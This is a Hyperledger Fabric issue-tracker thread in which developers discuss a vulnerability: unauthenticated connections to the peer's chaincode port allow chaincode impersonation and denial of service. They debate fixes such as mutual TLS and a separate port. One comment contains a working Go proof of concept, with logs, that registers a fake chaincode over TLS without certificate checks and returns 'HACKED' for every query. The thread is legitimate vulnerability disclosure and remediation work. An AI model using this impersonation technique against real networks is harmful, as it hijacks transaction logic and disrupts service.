<Action id="26412" issue="18038" author="yacovm" type="comment" created="2017-06-15 15:18:23.0" updateauthor="yacovm" updated="2017-06-15 15:18:23.0"> <body><! CDATA In theory one can always write a chaincode that connects to the peer as a client, and cooperates with a client that submits the transaction, therefore I don't think that having a separate port is a good option.  I think the best solution would be to: * Generate a self signed TLS cert and private key prior to CC launch and passing it to the chaincode container at startup via environment variables The peer side chaincode handler would associate the chaincode container's TLS certificate hash with the chaicode name/instance * The chaincode (shim side) would send its TLS certificate as a gRPC client to the peer as part of a connection * The peer chaincode handler would ensure the hash of the TLS certificate derived from the gRPC stream matches the stored hash in memory. * When the peer crashes the chaincode dies with it (as it is now), so when the peer would start up, a new TLS cert and key would be created for the new container  ></body> </Action>
<Action id="26435" issue="18038" author="jonathanlevi" type="comment" created="2017-06-15 17:13:12.0" updateauthor="jonathanlevi" updated="2017-06-15 17:13:12.0"> <body><! CDATA First, thanks for reporting this  ~ales .I tend to agree with you guys that "hiding" the port is/may not be not sufficient.  Just quickly, I believe that we need to, indeed, start thinking in terms of "and then ENTITY Y, who *requires* that,  ..." (similar to Yacov's suggestion that "the chain code handle "would ensure that the hash of ..."). That is, having some strong validation/verification step, that always takes place at some point/step.  ></body> </Action>
<Action id="26469" issue="18038" author="jonathanlevi" type="comment" created="2017-06-15 19:54:44.0" updateauthor="jonathanlevi" updated="2017-06-15 19:54:44.0"> <body><! CDATA Just to note that this has been "going on" for a while (that same "design" is in place since I remember this project / pre- v0.5). Not waving this off, of course, as I believe that it should get addressed (and get the adequate priority)... but I can't tell if we should really flag it as a "show stopper" at this point.  Happy for other to kindly chime-in & discuss... please.  ></body> </Action>
<Action id="26511" issue="18038" author="mastersingh24" type="comment" body="I agree with reducing the priority here.  It would be very, very difficult to pull off the race condition" created="2017-06-16 12:30:17.0" updateauthor="mastersingh24" updated="2017-06-16 12:30:17.0"/>
<Action id="26544" issue="18038" author="elli-androulaki" type="comment" created="2017-06-16 13:49:48.0" updateauthor="elli-androulaki" updated="2017-06-16 13:50:59.0"> <body><! CDATA Hm, so one could create on the fly TLS certificates to the chaincodes prior to launching them such that they are authenticated. We discussed and converged with   ~ales  to a solution where a peer has one TLS cert (and associated secret) generated for its chaincodes, and which the chaincodes of that peer could use to authenticate themselves to the peer. For v1, given that we trust the chaincodes this could suffice, and post-v1 we could move to more sophisticated solutions.   Notice, that the attack can be successful even more easily if the attacker finds out a way to kill the chaincode, cause it could just invoke the chaincode (with arguments that it knows it would kill it), kill it through its invocation, and then use another invocation to trigger chaincode launching and spawn the attack then.    ~mastersingh24 ,  ~JonathanLevi  what do you think?     ></body> </Action>
<Action id="26557" issue="18038" author="ashutosh_kumar" type="comment" body="I am coming from simplistic approach. First of all , if the Enterprise Network Architecture is done right , the peer port will not be known to outside world. Second of all , if it is architect right , the peer port will not be accessible from internal network, so the internal attack is minimized. Throttling at TCP layer might be panacea for race condition. Killing chaincode scenario should be handled at the chaincode layer. If done right , that vulnerability is difficult to exploit." created="2017-06-16 14:31:00.0" updateauthor="ashutosh_kumar" updated="2017-06-16 14:31:00.0"/>
<Action id="26561" issue="18038" author="elli-androulaki" type="comment" created="2017-06-16 14:48:08.0" updateauthor="elli-androulaki" updated="2017-06-16 14:48:08.0"> <body><! CDATA  ~ashutosh_kumar , I am not sure i understand.  >  if the Enterprise Network Architecture is done right , the peer port will not be known to outside world Well it depends how you define "outside world".  Would the client belong to the non-outside world? Cause in what we are describing above, the client could be part of the attacker. Clients need to know which port that is to be able to endorse their proposals.  > if it is architect right , the peer port will not be accessible from internal network, so the internal attack is minimized  Hm, do you refer to "external network" right? Again it depends who you consider your attacker to be.  > Killing chaincode scenario should be handled at the chaincode layer. If done right , that vulnerability is difficult to exploit. Killing the chaincode may be difficult, but still possible. But it is not required for the attack to succeed.   ></body> </Action>
<Action id="26565" issue="18038" author="ashutosh_kumar" type="comment" created="2017-06-16 15:02:02.0" updateauthor="ashutosh_kumar" updated="2017-06-16 15:02:02.0"> <body><! CDATA # What I talking about here is Zoning and Enclaving. Client request coming on internet , will hit Firewall , then load balancer and then PEER sitting behind firewall. Port that will be exposed is Load Balancer port. So the client will hit load balancer port , not peer port 7051.  2 . For internal attacker : Software Components on internal VLAN , usually will not have route to Peer Port. It will be managed by VLAN switches. So , from connectivity perspective , it is not possible.     For 1 and 2 to work , Network architecture has to be done right.     With TLS , I see one issue : Usually internet TLS  terminates at DMZ , so the self signed cert used for authentication will be applicable only at Load Balancer , not at docker container.        ></body> </Action>
<Action id="26581" issue="18038" author="binhn" type="comment" created="2017-06-16 16:06:09.0" updateauthor="binhn" updated="2017-06-16 16:06:09.0"> <body><! CDATA I agreed that with the precondition of having a bunch security layers wrapped around a peer, then we wouldn't have to worry about this, but the fact is the peer port is open and only uses server-side TLS, which enables potential attacks, including DoS. That is, I can't put the peer in the open and hope it would take care of itself.  It doesn't sound like it would take much to add mutual TLS, so we should do that to cover this potential problem.   ></body> </Action>
<Action id="26583" issue="18038" author="ashutosh_kumar" type="comment" body=" ~binhn  : Defense in Depth is always good to have. So , you want to use Mutual TLS as authentication mechanism ? If yes , where the credentials be stored ? On PEER filesystem ?" created="2017-06-16 16:17:08.0" updateauthor="ashutosh_kumar" updated="2017-06-16 16:17:21.0"/>
<Action id="26604" issue="18038" author="elli-androulaki" type="comment" created="2017-06-16 17:59:18.0" updateauthor="elli-androulaki" updated="2017-06-16 18:00:09.0"> <body><! CDATA  ~ashutosh_kumar , the idea is that:   - in the short term the peer will generate a tls certificate (and associated secrets) that will pass to the chaincodes that are launched by the peer. From then on, the peer will only accept connections from chaincodes with mutual TLS enabled, where client-cert is the same as the one of his chaincodes, and will reject other connections. This would be enough assuming that we "trust" the chaincodes that run on the peer.    - in the long term (post v1) we may consider solutions where the peer generates on the fly tls-certs and cert secrets (one per chaincode), or/and more invasive alternatives.     Regarding where the certs/keys are to be stored.  ~yacovm ,  ~ales  suggested to pass it as environment variable at chaincode launching.  ~ales  mentioned that docker containers (and thus chaincodes) could potentially connect to the peer via the peer's filesystem, e.g., share certain files. This would be another way for the peer to communicate certs/keys to the peer.  ~ales ,  ~yacovm  please correct/add more info as you think appropriate :)  ></body> </Action>
<Action id="26614" issue="18038" author="ashutosh_kumar" type="comment" body=" ~elli-androulaki  , so your authentication is based on Trust Chain validation(which will work for self signed certs) , not end user authentication. If that is the case , user(system) credentials  is  not in play here." created="2017-06-16 20:07:52.0" updateauthor="ashutosh_kumar" updated="2017-06-16 20:07:52.0"/>
<Action id="26632" issue="18038" author="yacovm" type="comment" created="2017-06-16 22:05:29.0" updateauthor="yacovm" updated="2017-06-17 08:42:23.0"> <body><! CDATA {quote}If this port is not protected, a remote attacker may connect to the peer and impersonate a chaincode during instantiation (or first invocation) by racing chaincode container creation. {quote} So the port is always not protected since the peer receives via that port requests from clients (i.e node SDK) {quote}I agree with reducing the priority here. It would be very, very difficult to pull off the race condition {quote} Actually I managed to pull off that race condition with very good results (almost always works), since the peer behaves deterministically and hence the timing is also. I managed to have a peer running with TLS and simulated a client via peer CLI that I ran via the IDE (yeah I know, it's ugly, but I needed everything to be in the same process and also I needed the chaincode golang code base)  The attack is as follows:  1) I connect to the peer via a non-authenticated gRPC stream (but via TLS, without a client cert since the peer doesn't enforce it) 2) I wait a certain time, it's always the same time I need to wait. 3) I send a query transaction to query A (example02) to the peer via invoking peer CLI  4) The peer creates a chaincode handler, and instead of starting the container, it sees my gRPC stream and assumes the container is already up 5) The peer sends to the IDE process a transaction message to query A 6) The message gets to my IDE process and runs my malicious chaincode shim that returns "HACKED" for everything 7) The result is returned to the peer CLI  The pseudo code that shows the attack in work is:  Notice I do 4 invokes: {code:java} 	go func() { 		m := newMediator(config.Peer.OrderingEndpoint) 		res, _ := m.invoke("yacov", "exampleCC",   string{"query", "a"}) 		fmt.Println(string(res)) 		res, _ = m.invoke("yacov", "exampleCC",   string{"query", "a"}) 		fmt.Println(string(res)) 		res, _ = m.invoke("yacov", "exampleCC",   string{"query", "a"}) 		fmt.Println(string(res)) 		res, _ = m.invoke("yacov", "exampleCC",   string{"query", "a"}) 		fmt.Println(string(res)) 	}() time.Sleep(some_time) chat() {code} the *chat()* creates a stream with the peer and impersonates a chaincode shim.  while the *mediator* object is simply the peer CLI in another form: {code:java} 	broadcastClient, err := common.GetBroadcastClient(ordererEndpoint, true, "/home/yacovm/fabricDeployment/vm1/sampleconfig/tls/ca.crt") 	if err != nil { 		panic(err) 	} 	endorserClient, err := common.GetEndorserClient() 	if err != nil { 		panic(err) 	} 	signer, err := common.GetDefaultSigner() 	if err != nil { 		panic(err) 	} 	return &mediator{ 		broadcastClient: broadcastClient, 		signer:          signer, 		endorserClient:  endorserClient, 	} {code} The chaincode that actually runs (instead of the container chaincode example02 which doesn't launch because the peer decides it doesn't need to) is the chaincode from my IDE: {code:java} type cc struct {  }  func (*cc) Init(stub shim.ChaincodeStubInterface) pb.Response { 	panic("implement me") }  func (*cc) Invoke(stub shim.ChaincodeStubInterface) pb.Response { 	return shim.Success(  byte("HACKED")) } {code} and the IDE console prints: {code:java} mspIdD: PeerOrg mspMgrConfigDir: /home/yacovm/fabricDeployment/crypto-config/peerOrganizations/hrl.ibm.il/users/User1@hrl.ibm.il/msp RECV: type:REGISTERED  RECV: type:READY txid:"0ae6457546317b049ad909282f4ee179574c0e55c2decb2c327488afa0f2894b" proposal:<proposal_bytes:"\n\226\007\nh\010\003\032\014\010\304\242\221\312\005\020\350\210\374\324\001\"\005yacov*@0ae6457546317b049ad909282f4ee179574c0e55c2decb2c327488afa0f2894b:\r\022\013\022\texampleCC\022\251\006\n\214\006\n\007PeerOrg\022\200\006-----BEGIN -----\nMIICGzCCAcKgAwIBAgIQdC7vc2bH1QRP7qSbQsZuNTAKBggqhkjOPQQDAjBnMQsw\nCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNU2FuIEZy\nYW5jaXNjbzETMBEGA1UEChMKaHJsLmlibS5pbDEWMBQGA1UEAxMNY2EuaHJsLmli\nbS5pbDAeFw0xNzA2MTYxOTUzNTZaFw0yNzA2MTQxOTUzNTZaMFUxCzAJBgNVBAYT\nAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRYwFAYDVQQHEw1TYW4gRnJhbmNpc2Nv\nMRkwFwYDVQQDDBBVc2VyMUBocmwuaWJtLmlsMFkwEwYHKoZIzj0CAQYIKoZIzj0D\nAQcDQgAEWqmP+eCViadJ5GjF+0h5Czy+PrBzHGbpCIAaaKEOzgkOW/EvzqLGg2xh\njxWbTfQG1XwEOPEsJarfQMTrllxABKNiMGAwDgYDVR0PAQH/BAQDAgWgMBMGA1Ud\nJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwKwYDVR0jBCQwIoAgOPIOmUnW\nV2slY0AusHs2MbSKsI3TecLIWb4aq75Wuv0wCgYIKoZIzj0EAwIDRwAwRAIgASAM\neILo8GZKnEr+Oy6URZlgxvROqXqDU4NunZrYKO4CIGBwTV5Rzet+ej048LqIlDMg\nRrN2PMxD7sqOv0FpZjyp\n-----END -----\n\022\030\270\325\255<\344\2768\256\342\026v\325a-\272\346\310\3735A\243<\2373\022\037\n\035\n\033\010\001\022\013\022\texampleCC\032\n\n\005query\n\001a" signature:"0D\002 \023\3345\007\316m\023\315K\356P\301\232V\212\232\000V*\251_\351\253a\266e8Pq<cA\002 \014\333!4\272\206\241\365\303\001\355>\361\006\317\344z\263\003pf \317\212H\025\272\366 \223\316\230" >  RECV: type:TRANSACTION payload:"\n\005query\n\001a" txid:"0ae6457546317b049ad909282f4ee179574c0e55c2decb2c327488afa0f2894b" proposal:<proposal_bytes:"\n\226\007\nh\010\003\032\014\010\304\242\221\312\005\020\350\210\374\324\001\"\005yacov*@0ae6457546317b049ad909282f4ee179574c0e55c2decb2c327488afa0f2894b:\r\022\013\022\texampleCC\022\251\006\n\214\006\n\007PeerOrg\022\200\006-----BEGIN -----\nMIICGzCCAcKgAwIBAgIQdC7vc2bH1QRP7qSbQsZuNTAKBggqhkjOPQQDAjBnMQsw\nCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNU2FuIEZy\nYW5jaXNjbzETMBEGA1UEChMKaHJsLmlibS5pbDEWMBQGA1UEAxMNY2EuaHJsLmli\nbS5pbDAeFw0xNzA2MTYxOTUzNTZaFw0yNzA2MTQxOTUzNTZaMFUxCzAJBgNVBAYT\nAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRYwFAYDVQQHEw1TYW4gRnJhbmNpc2Nv\nMRkwFwYDVQQDDBBVc2VyMUBocmwuaWJtLmlsMFkwEwYHKoZIzj0CAQYIKoZIzj0D\nAQcDQgAEWqmP+eCViadJ5GjF+0h5Czy+PrBzHGbpCIAaaKEOzgkOW/EvzqLGg2xh\njxWbTfQG1XwEOPEsJarfQMTrllxABKNiMGAwDgYDVR0PAQH/BAQDAgWgMBMGA1Ud\nJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwKwYDVR0jBCQwIoAgOPIOmUnW\nV2slY0AusHs2MbSKsI3TecLIWb4aq75Wuv0wCgYIKoZIzj0EAwIDRwAwRAIgASAM\neILo8GZKnEr+Oy6URZlgxvROqXqDU4NunZrYKO4CIGBwTV5Rzet+ej048LqIlDMg\nRrN2PMxD7sqOv0FpZjyp\n-----END -----\n\022\030\270\325\255<\344\2768\256\342\026v\325a-\272\346\310\3735A\243<\2373\022\037\n\035\n\033\010\001\022\013\022\texampleCC\032\n\n\005query\n\001a" signature:"0D\002 \023\3345\007\316m\023\315K\356P\301\232V\212\232\000V*\251_\351\253a\266e8Pq<cA\002 \014\333!4\272\206\241\365\303\001\355>\361\006\317\344z\263\003pf \317\212H\025\272\366 \223\316\230" >  HACKED RECV: type:TRANSACTION payload:"\n\005query\n\001a" txid:"aaae92f5fab6f7cd85d3396968014f590a2d10ecdd4004bc328b3e87edb61d91" proposal:<proposal_bytes:"\n\226\007\nh\010\003\032\014\010\304\242\221\312\005\020\266\303\364\202\002\"\005yacov*@aaae92f5fab6f7cd85d3396968014f590a2d10ecdd4004bc328b3e87edb61d91:\r\022\013\022\texampleCC\022\251\006\n\214\006\n\007PeerOrg\022\200\006-----BEGIN -----\nMIICGzCCAcKgAwIBAgIQdC7vc2bH1QRP7qSbQsZuNTAKBggqhkjOPQQDAjBnMQsw\nCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNU2FuIEZy\nYW5jaXNjbzETMBEGA1UEChMKaHJsLmlibS5pbDEWMBQGA1UEAxMNY2EuaHJsLmli\nbS5pbDAeFw0xNzA2MTYxOTUzNTZaFw0yNzA2MTQxOTUzNTZaMFUxCzAJBgNVBAYT\nAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRYwFAYDVQQHEw1TYW4gRnJhbmNpc2Nv\nMRkwFwYDVQQDDBBVc2VyMUBocmwuaWJtLmlsMFkwEwYHKoZIzj0CAQYIKoZIzj0D\nAQcDQgAEWqmP+eCViadJ5GjF+0h5Czy+PrBzHGbpCIAaaKEOzgkOW/EvzqLGg2xh\njxWbTfQG1XwEOPEsJarfQMTrllxABKNiMGAwDgYDVR0PAQH/BAQDAgWgMBMGA1Ud\nJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwKwYDVR0jBCQwIoAgOPIOmUnW\nV2slY0AusHs2MbSKsI3TecLIWb4aq75Wuv0wCgYIKoZIzj0EAwIDRwAwRAIgASAM\neILo8GZKnEr+Oy6URZlgxvROqXqDU4NunZrYKO4CIGBwTV5Rzet+ej048LqIlDMg\nRrN2PMxD7sqOv0FpZjyp\n-----END -----\n\022\030#\341\363X\265\271\013\307\374\326(V$\3366|\372q#\037\321^\254%\022\037\n\035\n\033\010\001\022\013\022\texampleCC\032\n\n\005query\n\001a" signature:"0D\002 6\332\261Za\016\347_ g\002c\370\361\243\256\210?t#.\275\035c\3502\265\263\272\034N\003\002 #\222 Zn\261T\260\334>\247\254\365f>\013`\2772\000\235\254\271\214F\300$\007=\273\205\311" >  HACKED RECV: type:TRANSACTION payload:"\n\005query\n\001a" txid:"0ed45515048befb8ea268a341ad203aacfc2e64b98af4bc3641d04579354d7f3" proposal:<proposal_bytes:"\n\226\007\nh\010\003\032\014\010\304\242\221\312\005\020\210\256\350\210\002\"\005yacov*@0ed45515048befb8ea268a341ad203aacfc2e64b98af4bc3641d04579354d7f3:\r\022\013\022\texampleCC\022\251\006\n\214\006\n\007PeerOrg\022\200\006-----BEGIN -----\nMIICGzCCAcKgAwIBAgIQdC7vc2bH1QRP7qSbQsZuNTAKBggqhkjOPQQDAjBnMQsw\nCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNU2FuIEZy\nYW5jaXNjbzETMBEGA1UEChMKaHJsLmlibS5pbDEWMBQGA1UEAxMNY2EuaHJsLmli\nbS5pbDAeFw0xNzA2MTYxOTUzNTZaFw0yNzA2MTQxOTUzNTZaMFUxCzAJBgNVBAYT\nAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRYwFAYDVQQHEw1TYW4gRnJhbmNpc2Nv\nMRkwFwYDVQQDDBBVc2VyMUBocmwuaWJtLmlsMFkwEwYHKoZIzj0CAQYIKoZIzj0D\nAQcDQgAEWqmP+eCViadJ5GjF+0h5Czy+PrBzHGbpCIAaaKEOzgkOW/EvzqLGg2xh\njxWbTfQG1XwEOPEsJarfQMTrllxABKNiMGAwDgYDVR0PAQH/BAQDAgWgMBMGA1Ud\nJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwKwYDVR0jBCQwIoAgOPIOmUnW\nV2slY0AusHs2MbSKsI3TecLIWb4aq75Wuv0wCgYIKoZIzj0EAwIDRwAwRAIgASAM\neILo8GZKnEr+Oy6URZlgxvROqXqDU4NunZrYKO4CIGBwTV5Rzet+ej048LqIlDMg\nRrN2PMxD7sqOv0FpZjyp\n-----END -----\n\022\030\006\212\213&\261;\320\003G\024\244\002\200\346\032\032\013\2322C\376\030`)\022\037\n\035\n\033\010\001\022\013\022\texampleCC\032\n\n\005query\n\001a" signature:"0D\002 (\371\277\304cV\257\341H\336\363\260IR@\270\345\036\222\213\246\203\357\255I\357:>\260\024\210.\002 O\215KVX\"\323\251\202`\322\336 \177\000J\360\317W\340\243~\327\314i \302\322x\273gz" >  HACKED RECV: type:TRANSACTION payload:"\n\005query\n\001a" txid:"a109b08ab73b495a87d648a9490e2aedd737bb22620c9e5f121213c439ca2acd" proposal:<proposal_bytes:"\n\225\007\ng\010\003\032\013\010\325\242\221\312\005\020\250\364\220?\"\005yacov*@a109b08ab73b495a87d648a9490e2aedd737bb22620c9e5f121213c439ca2acd:\r\022\013\022\texampleCC\022\251\006\n\214\006\n\007PeerOrg\022\200\006-----BEGIN -----\nMIICGzCCAcKgAwIBAgIQdC7vc2bH1QRP7qSbQsZuNTAKBggqhkjOPQQDAjBnMQsw\nCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNU2FuIEZy\nYW5jaXNjbzETMBEGA1UEChMKaHJsLmlibS5pbDEWMBQGA1UEAxMNY2EuaHJsLmli\nbS5pbDAeFw0xNzA2MTYxOTUzNTZaFw0yNzA2MTQxOTUzNTZaMFUxCzAJBgNVBAYT\nAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRYwFAYDVQQHEw1TYW4gRnJhbmNpc2Nv\nMRkwFwYDVQQDDBBVc2VyMUBocmwuaWJtLmlsMFkwEwYHKoZIzj0CAQYIKoZIzj0D\nAQcDQgAEWqmP+eCViadJ5GjF+0h5Czy+PrBzHGbpCIAaaKEOzgkOW/EvzqLGg2xh\njxWbTfQG1XwEOPEsJarfQMTrllxABKNiMGAwDgYDVR0PAQH/BAQDAgWgMBMGA1Ud\nJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwKwYDVR0jBCQwIoAgOPIOmUnW\nV2slY0AusHs2MbSKsI3TecLIWb4aq75Wuv0wCgYIKoZIzj0EAwIDRwAwRAIgASAM\neILo8GZKnEr+Oy6URZlgxvROqXqDU4NunZrYKO4CIGBwTV5Rzet+ej048LqIlDMg\nRrN2PMxD7sqOv0FpZjyp\n-----END -----\n\022\030|B9\305\203\213\204\352^\374O\303\324\221\262\343\032VD\006\276\306n1\022\037\n\035\n\033\010\001\022\013\022\texampleCC\032\n\n\005query\n\001a" signature:"0D\002 \013z\201\264\225n\273\345\204\261\221R\226\303!\375\321\013\352\377id\014\216(i\362Z\010\025\256\222\002 \002\367S\227\301~\224#~\336\022x\222\2328\005\227\231\034\372v1R\216\325C\200\311\304\312\250~" >  HACKED  {code}  Notice the 4 invokes from my example are shown here, meaning- if an attacker manages to pull this off, it de facto controls the chaincode logic for all invokes to the chaincode.  ></body> </Action>
<Action id="26634" issue="18038" author="binhn" type="comment" created="2017-06-16 22:24:19.0" updateauthor="binhn" updated="2017-06-16 22:24:19.0"> <body><! CDATA  ~yacovm   very nifty work and thanks.  Hey everyone, we have a security hacker on the team :)  Seriously, as I commented above, we need to fix this problem.    ~JonathanLevi ,  ~mastersingh24   I know you both wanted to lower the priority here, but with the info from Yacov, I am upping the priority, but in any case, Ale said he will have the CR by Monday.   ></body> </Action>
<Action id="26635" issue="18038" author="yacovm" type="comment" created="2017-06-16 22:36:07.0" updateauthor="yacovm" updated="2017-06-16 22:36:07.0"> <body><! CDATA Something I forgot to mention: An attacker doesn't need to "win the race" in order to cause damage: as long as you know the name of the chaincode, you can connect to the peer and send a REGISTER request to the peer, and then when an invocation is sent to the peer it will *not* start the container because it would deem the chaincode already running because the peer-side chaincode handler registered the attacker's gRPC stream. This means that *anyone*, can connect to a peer *without any certificate* and then do denial of service: the peer would get a chaincode invocation request from an honest client, and would activate the FSM code - which would fail, and the chaincode invocation would time-out.  {quote} - in the long term (post v1) we may consider solutions where the peer generates on the fly tls-certs and cert secrets (one per chaincode), or/and more invasive alternatives.{quote} If I may chime in here, and I may think too much in "all or nothing" terms but I think that if we are to fix this, we should fix it once and for all and have the best fix possible. The best fix possible in my opinion is to have a TLS certificate per chaincode instance, and not globally.  Otherwise, a malicious chaincode could connect to the peer and register a gRPC stream under any chaincode name, hence starving the peer of chaincode invocation ability.   ></body> </Action>
<Action id="26651" issue="18038" author="mastersingh24" type="comment" created="2017-06-17 13:26:37.0" updateauthor="mastersingh24" updated="2017-06-17 13:26:37.0"> <body><! CDATA My points are simple:  1) So after more than a year, we decide that this is an issue?   Note:  I've brought up similar issues multiple times and no one seemed to think it was an issue  2) If we all consider this a serious flaw, then we need to go all in to fix it (basically the same point as  ~yacovm  was making):  - chaincode server endpoint should be separate from the peer endpoint (as the peer endpoint must be widely accessible on a network) - agree with using mutual TLS - TLS key pair(s) should be randomly generated anytime the container needs to be started / registered  This is not a small thing to do  ></body> </Action>
<Action id="26653" issue="18038" author="yacovm" type="comment" created="2017-06-17 13:52:30.0" updateauthor="yacovm" updated="2017-06-17 13:52:30.0"> <body><! CDATA {quote}chaincode server endpoint should be separate from the peer endpoint (as the peer endpoint must be widely accessible on a network){quote} I think that this is a good opportunity to do this too, as the chaincode and the peer "come together" and it's not a real API change, it's an internal one.  With this, we could use a different TLS server configuration - one that for example, isn't influenced by the existing TLS root CA cert pool,  ~ales  what do you think? won't that help your change set somehow, with the DN issue?  ></body> </Action>
<Action id="26656" issue="18038" author="ales" type="comment" created="2017-06-17 14:06:14.0" updateauthor="ales" updated="2017-06-17 14:06:14.0"> <body><! CDATA Thx  ~mastersingh24  and  ~yacovm    > 1) So after more than a year, we decide that this is an issue? Note: I've brought up similar issues multiple times and no one seemed to think it was an issue  Unfortunately I wasn't present when you discussed this, I'd have certainly backed you up! I raised the issue as soon as I spotted it.  > This is not a small thing to do  Agreed also on this front!  FWIW, I'd draw the line as follows: we can't ship if a remote unprivileged attacker can always DoS (as described by Yacov) and may even be able to impersonate if it wins the race. Everything else is "good to have".  ~elli-androulaki ,  ~ellaki ,  ~angelo.decaro , wdyt?    ></body> </Action>
<Action id="26657" issue="18038" author="muralisr" type="comment" created="2017-06-17 15:19:17.0" updateauthor="muralisr" updated="2017-06-17 16:47:35.0"> <body><! CDATA    There are 4 main entry points for chaincode # in process (as done in UT, system chaincodes etc) that create a stream and registers a chaincode # in host (as in chaincodedev mode, docker daemon on the host, etc) connecting via TLS # external to the host but within the network protection perimeter connecting via TLS # external to the network connecting via TLS  In both 1) and 2) the peer env is directly hacked into and all bets are off about its integrity in general. The whole peer is a casualty at this point and can be considered malicious.   ~yacovm  From my reading, seems the "Chat" function falls into 1. Or you did 3 or 4 and I misread it ?   If the test does not fall into 4 (or even 3 for that matter) I don't see this a High - compared with the risk of doing an invasive change this close to release that may be higher. And then I agree with  ~mastersingh24  point about the difficulty in exploiting the race and can see arguments about network protection ( ~ashutosh_kumar ) being relevant here.   FWIW, to tag on to  ~mastersingh24  point, we have been wanting to run chaincode on a different port (and also talked about mutual auth in the past). Just wanted to make sure we fully understand the concerns here before go off and do something risky at this point.     ></body> </Action>
<Action id="26661" issue="18038" author="yacovm" type="comment" created="2017-06-17 17:15:17.0" updateauthor="yacovm" updated="2017-06-17 17:23:01.0"> <body><! CDATA {quote}3. external to the host but within the network protection perimeter connecting via TLS 4. external to the network connecting via TLS{quote} They are the same. Also keep in mind that the peer doesn't do mutual TLS and the chaincode server-side stream doesn't do *any* checks of the certificate of the client, and doesn't check for an existence of such. TLS doesn't protect the peer here, it's worthless in this aspect. It actually protects the chaincode from connecting to a peer that impersonates the real peer, and of course - encrypts your traffic.   {quote}Yacov Manevich From my reading, seems the "Chat" function falls into 1. Or you did 3 or 4 and I misread it ? {quote} So the "chat()" function is: {code} 	creds := &tls.Config{ 		InsecureSkipVerify: true, 	} 	conn, err := grpc.Dial(viper.GetString("peer.address"), grpc.WithBlock(), grpc.WithTimeout(time.Second), grpc.WithTransportCredentials(credentials.NewTLS(creds))) 	if err != nil { 		panic(err) 	} 	defer conn.Close() 	chaincodeSupportClient := pb.NewChaincodeSupportClient(conn)  	stream, err := chaincodeSupportClient.Register(context.Background()) 	shim.ChatWithPeer(ccName, stream, &cc{}) {code}  Notice I didn't use a certificate to prime the TLS credentials.   I ran the IDE from a linux VM and the peer is running on another VM on the same LAN. Clearly - this is 3 and 4 from your list.   {quote}compared with the risk of doing an invasive change this close to release that may be higher. {quote} This invasive change is well tested by our integration tests, since our integration tests use TLS and invoke chaincode. {quote} And then I agree with Gari Singh point about the difficulty in exploiting the race {quote} The problem with the race thing, that the time you need to wait is deterministic. It's the same time, each time.   ></body> </Action>
<Action id="26662" issue="18038" author="ales" type="comment" created="2017-06-17 17:27:40.0" updateauthor="ales" updated="2017-06-17 17:27:40.0"> <body><! CDATA Let me bring a perspective from my field: the security world uses CVSS as a way of measuring vulnerabilities. Scores range from 0 to 10, with 10 being the most severe. I would rate this as 9.7 with the following vector   https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?vector=(AV:N/AC:L/Au:N/C:P/I:C/A:C)   Many companies require VP-level approval to ship a product with a 9.7 CVSS.  ></body> </Action>
<Action id="26663" issue="18038" author="ales" type="comment" created="2017-06-17 17:39:34.0" updateauthor="ales" updated="2017-06-17 17:39:58.0"> <body><! CDATA The scoring in my previous comment could be argued as "worst-case". A more conservative vector might be    https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?vector=(AV:N/AC:L/Au:N/C:P/I:P/A:P )  which leads to 7.5 - a bit better but still pretty serious.  ></body> </Action>
<Action id="26664" issue="18038" author="muralisr" type="comment" body=" ~yacovm   ~ales  thanks. That helps... will look at the CR (connection a bit spotty as I&apos;m on the road so will update when I can)." created="2017-06-17 17:48:35.0" updateauthor="muralisr" updated="2017-06-17 17:48:35.0"/>
<Action id="26670" issue="18038" author="muralisr" type="comment" created="2017-06-18 00:55:26.0" updateauthor="muralisr" updated="2017-06-18 00:55:26.0"> <body><! CDATA Did some test to get to root cause... peer knows its a chaincode not started by it (look at the last two lines in the logs below)... but does nothing about it. This should be something to be nipped in the bud right upfront .  When not in devmode, peer should kick the chaincode out right at the time of Register instead of keeping it around. Then the window for it to sneak in would be between the startup of the container from invoke and the devmode-like attacker chaincode trying to get in before it got kicked out (that would be real tricky).  This is the actual race  ~mastersingh24  mentioned earlier.  {code:java} 2017-06-17 20:23:34.871 EDT  chaincode  HandleChaincodeStream -> DEBU 30c Current context deadline = 0001-01-01 00:00:00 +0000 UTC, ok = false 2017-06-17 20:23:34.871 EDT  chaincode  processStream -> DEBU 30d   Received message REGISTER from shim 2017-06-17 20:23:34.871 EDT  chaincode  HandleMessage -> DEBU 30e   Fabric side Handling ChaincodeMessage of type: REGISTER in state created 2017-06-17 20:23:34.871 EDT  chaincode  beforeRegisterEvent -> DEBU 30f Received REGISTER in state created 2017-06-17 20:23:34.871 EDT  chaincode  registerHandler -> DEBU 310 registered handler complete for chaincode mycc:0 2017-06-17 20:23:34.871 EDT  chaincode  beforeRegisterEvent -> DEBU 311 Got REGISTER for chaincodeID = name:"mycc:0" , sending back REGISTERED 2017-06-17 20:23:34.871 EDT  chaincode  notifyDuringStartup -> DEBU 312 nothing to notify (dev mode ?) 2017-06-17 20:23:34.871 EDT  chaincode  notifyDuringStartup -> WARN 313 trying to manually run chaincode when not in devmode ? {code}  Kicking out  the external chaincode when not in devmode and not allowing it to REGISTER ... this doesn't make the TLS connection more secure - so we still do need to consider this JIRA - but  makes it more difficult to exploit than  ~yacovm  did.   I'll look into that too and update by tomorrow.  ></body> </Action>
